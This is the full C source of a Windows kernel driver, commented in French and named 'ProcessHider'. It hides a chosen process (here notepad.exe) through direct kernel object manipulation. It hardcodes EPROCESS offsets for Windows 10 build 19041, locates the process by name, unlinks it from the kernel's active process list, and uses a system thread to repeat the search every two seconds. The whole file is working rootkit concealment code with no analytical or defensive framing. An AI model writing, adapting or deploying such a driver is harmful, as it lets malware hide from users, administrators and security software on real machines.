#include <ntddk.h>

#define PROCESS_TO_HIDE L"notepad.exe"

// Structure EPROCESS partielle (offsets pour Windows 10)
typedef struct _EPROCESS_OFFSETS {
    ULONG ActiveProcessLinks;  // Offset de ActiveProcessLinks
    ULONG ImageFileName;       // Offset de ImageFileName
} EPROCESS_OFFSETS;

// Offsets pour Windows 10 x64 (Build 19041)
EPROCESS_OFFSETS g_Offsets = {
    .ActiveProcessLinks = 0x448,  // Windows 10 Build 19041
    .ImageFileName = 0x5a8        // Windows 10 Build 19041
};

PEPROCESS g_HiddenProcess = NULL;
LIST_ENTRY g_RemovedListEntry = {0};

// Fonction pour cacher un processus en le retirant de la liste
NTSTATUS HideProcess(PEPROCESS Process)
{
    PLIST_ENTRY CurrentList;
    PLIST_ENTRY NextList;
    
    if (!Process)
        return STATUS_INVALID_PARAMETER;
    
    // Obtenir le pointeur vers ActiveProcessLinks
    CurrentList = (PLIST_ENTRY)((PUCHAR)Process + g_Offsets.ActiveProcessLinks);
    
    // Sauvegarder les liens pour pouvoir restaurer plus tard
    g_RemovedListEntry.Flink = CurrentList->Flink;
    g_RemovedListEntry.Blink = CurrentList->Blink;
    
    // Retirer de la liste chaînée
    NextList = CurrentList->Flink;
    CurrentList->Blink->Flink = CurrentList->Flink;
    CurrentList->Flink->Blink = CurrentList->Blink;
    
    // Pointer vers lui-même pour éviter les erreurs
    CurrentList->Flink = CurrentList;
    CurrentList->Blink = CurrentList;
    
    DbgPrint("[ProcessHider] Process hidden via DKOM\n");
    
    return STATUS_SUCCESS;
}

// Fonction pour restaurer le processus dans la liste
NTSTATUS UnhideProcess(PEPROCESS Process)
{
    PLIST_ENTRY CurrentList;
    
    if (!Process || !g_RemovedListEntry.Flink)
        return STATUS_INVALID_PARAMETER;
    
    CurrentList = (PLIST_ENTRY)((PUCHAR)Process + g_Offsets.ActiveProcessLinks);
    
    // Restaurer les liens
    CurrentList->Flink = g_RemovedListEntry.Flink;
    CurrentList->Blink = g_RemovedListEntry.Blink;
    
    g_RemovedListEntry.Flink->Blink = CurrentList;
    g_RemovedListEntry.Blink->Flink = CurrentList;
    
    DbgPrint("[ProcessHider] Process unhidden\n");
    
    return STATUS_SUCCESS;
}

// Fonction pour trouver un processus par nom
PEPROCESS FindProcessByName(PCWSTR ProcessName)
{
    PEPROCESS CurrentProcess = PsGetCurrentProcess();
    PEPROCESS StartProcess = CurrentProcess;
    PLIST_ENTRY CurrentList;
    PCHAR ImageFileName;
    CHAR ProcessNameA[15] = {0};
    SIZE_T i;
    
    // Convertir Unicode en ASCII pour la comparaison
    for (i = 0; i < 14 && ProcessName[i] != L'\0'; i++)
    {
        ProcessNameA[i] = (CHAR)ProcessName[i];
    }
    ProcessNameA[i] = '\0';
    
    do
    {
        // Obtenir le nom du processus
        ImageFileName = (PCHAR)((PUCHAR)CurrentProcess + g_Offsets.ImageFileName);
        
        DbgPrint("[ProcessHider] Checking process: %s\n", ImageFileName);
        
        // Comparer avec le processus recherché
        if (_stricmp(ImageFileName, ProcessNameA) == 0)
        {
            DbgPrint("[ProcessHider] Found target process: %s\n", ImageFileName);
            ObReferenceObject(CurrentProcess);
            return CurrentProcess;
        }
        
        // Passer au processus suivant
        CurrentList = (PLIST_ENTRY)((PUCHAR)CurrentProcess + g_Offsets.ActiveProcessLinks);
        CurrentProcess = (PEPROCESS)((PUCHAR)CurrentList->Flink - g_Offsets.ActiveProcessLinks);
        
    } while (CurrentProcess != StartProcess);
    
    return NULL;
}

// Thread qui surveille et cache le processus
VOID MonitorThread(PVOID Context)
{
    UNREFERENCED_PARAMETER(Context);
    
    DbgPrint("[ProcessHider] Monitor thread started\n");
    
    while (TRUE)
    {
        // Attendre 2 secondes
        LARGE_INTEGER Interval;
        Interval.QuadPart = -20000000LL; // 2 secondes
        KeDelayExecutionThread(KernelMode, FALSE, &Interval);
        
        // Si on n'a pas encore caché le processus
        if (!g_HiddenProcess)
        {
            PEPROCESS Process = FindProcessByName(PROCESS_TO_HIDE);
            
            if (Process)
            {
                DbgPrint("[ProcessHider] Hiding process...\n");
                HideProcess(Process);
                g_HiddenProcess = Process;
            }
        }
    }
}

// Fonction de déchargement
VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    
    // Restaurer le processus si caché
    if (g_HiddenProcess)
    {
        UnhideProcess(g_HiddenProcess);
        ObDereferenceObject(g_HiddenProcess);
        g_HiddenProcess = NULL;
    }
    
    DbgPrint("[ProcessHider] Driver unloaded\n");
}

// Point d'entrée
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    HANDLE ThreadHandle;
    OBJECT_ATTRIBUTES ObjectAttributes;
    NTSTATUS Status;
    
    UNREFERENCED_PARAMETER(RegistryPath);
    
    DbgPrint("[ProcessHider] DKOM Driver loading...\n");
    
    DriverObject->DriverUnload = DriverUnload;
    
    // Créer un thread de surveillance
    InitializeObjectAttributes(&ObjectAttributes, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
    
    Status = PsCreateSystemThread(
        &ThreadHandle,
        THREAD_ALL_ACCESS,
        &ObjectAttributes,
        NULL,
        NULL,
        MonitorThread,
        NULL
    );
    
    if (!NT_SUCCESS(Status))
    {
        DbgPrint("[ProcessHider] Failed to create monitor thread: 0x%X\n", Status);
        return Status;
    }
    
    ZwClose(ThreadHandle);
    
    DbgPrint("[ProcessHider] DKOM Driver loaded successfully\n");
    DbgPrint("[ProcessHider] Monitoring for %S...\n", PROCESS_TO_HIDE);
    
    return STATUS_SUCCESS;
}